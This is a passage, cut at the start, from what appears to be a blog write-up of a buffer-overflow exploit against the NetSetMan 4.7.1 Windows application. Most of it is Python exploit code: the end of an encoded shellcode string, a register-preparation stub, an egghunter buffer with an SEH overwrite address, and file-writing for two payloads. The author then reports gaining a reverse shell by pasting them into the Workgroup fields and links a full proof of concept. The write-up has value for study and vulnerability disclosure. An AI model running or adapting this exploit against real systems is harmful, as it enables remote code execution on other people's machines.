#BA2121">&quot;PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIA&quot;</span><br /><span style="color: #BA2121">&quot;IAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30A&quot;</span><br /><span style="color: #BA2121">&quot;PB944JBC6SQGZKOLO0B0RQZOSR88MNNOLKUPZSDJO6XT7NPNP3DTKKJ6OD5JJ&quot;</span><br /><span style="color: #BA2121">&quot;6OBUK7KOYWLJA&quot;</span><br />)<br /><br />regPrep <span style="color: #666666">=</span> (<br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x63</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#nop/align</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x55</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#push ebp</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#nop/align</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x58</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#pop eax</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#nop/align</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x05\x14\x11</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#add eax, 0x11001400</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#nop/align</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x2d\x13\x11</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#sub eax, 0x11001300</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#nop/align</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x50</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#push eax</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#nop/align</span><br />    <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\xc3</span><span style="color: #BA2121">&quot;</span>) <span style="color: #408080; font-style: italic">#ret</span><br /><br /><span style="color: #008000">buffer</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span><br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x61</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">*</span> <span style="color: #666666">75</span> <span style="color: #408080; font-style: italic">#junk</span><br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">*</span> <span style="color: #666666">1</span>  <span style="color: #408080; font-style: italic">#nop</span><br /><br /><span style="color: #408080; font-style: italic">#0x00590058 : pop ebx # pop ebp # ret 0x08 | startnull,unicode,asciiprint,ascii {PAGE_EXECUTE_READ} [netsetman.exe] </span><br /><span style="color: #408080; font-style: italic">#ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.7.1.0 (C:\Program Files\NetSetMan\netsetman.exe)</span><br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x58\x59</span><span style="color: #BA2121">&quot;</span> <span style="color: #408080; font-style: italic">#SEH overwrite to pop-pop-ret instruction</span><br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> regPrep<br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x62</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">*</span> <span style="color: #666666">108</span> <span style="color: #408080; font-style: italic">#offset to egghunter</span><br /><span style="color: #008000">buffer</span> <span style="color: #666666">+=</span> egghunter<br /><br /><span style="color: #408080; font-style: italic">#Write initial SEH overflow payload + egghunter with venetian shellcode</span><br />f <span style="color: #666666">=</span> <span style="color: #008000">open</span>(<span style="color: #BA2121">&#39;payload1.txt&#39;</span>,<span style="color: #BA2121">&#39;w&#39;</span>)<br />f<span style="color: #666666">.</span>write(<span style="color: #008000">buffer</span>)<br />f<span style="color: #666666">.</span>close()<br /><br /><span style="color: #408080; font-style: italic">#Egg + alphanumeric encoded shellcode payload</span><br />g <span style="color: #666666">=</span> <span style="color: #008000">open</span>(<span style="color: #BA2121">&#39;payload2.txt&#39;</span>, <span style="color: #BA2121">&#39;w&#39;</span>)<br />g<span style="color: #666666">.</span>write(shellcode)<br />g<span style="color: #666666">.</span>close()<br /></pre></div><br />Pasting the reverse shell into the second tab's Workgroup field followed by pasting the first part of the payload (our egghunter) into the first tab's Workgroup field and hitting "Activate"...<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-4oaXndew63k/XIrOZ1Sl0YI/AAAAAAAAA2U/hNY-yqR7O8wLOtfw-GAu8QKmUNVV7nOKgCEwYBhgL/s1600/rev_connect.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="632" data-original-width="643" height="627" src="https://3.bp.blogspot.com/-4oaXndew63k/XIrOZ1Sl0YI/AAAAAAAAA2U/hNY-yqR7O8wLOtfw-GAu8QKmUNVV7nOKgCEwYBhgL/s640/rev_connect.png" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/--nYG-M--pWw/XIrOaRSFEfI/AAAAAAAAA2Y/jtcCeUkzSFUdA9h6ruuZnoiqzneFOEsagCEwYBhgL/s1600/rev_shell2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="156" data-original-width="663" height="148" src="https://3.bp.blogspot.com/--nYG-M--pWw/XIrOaRSFEfI/AAAAAAAAA2Y/jtcCeUkzSFUdA9h6ruuZnoiqzneFOEsagCEwYBhgL/s640/rev_shell2.png" width="640" /></a></div><br />Success!<br /><br />The full PoC (with a Calc payload) can be found on <a href="https://www.exploit-db.com/exploits/46530">Exploit-DB</a>. This ended up being a fun challenge and I managed to exercise some OSCE skills. Time to find some more!<br /><br /><br /><br /><br />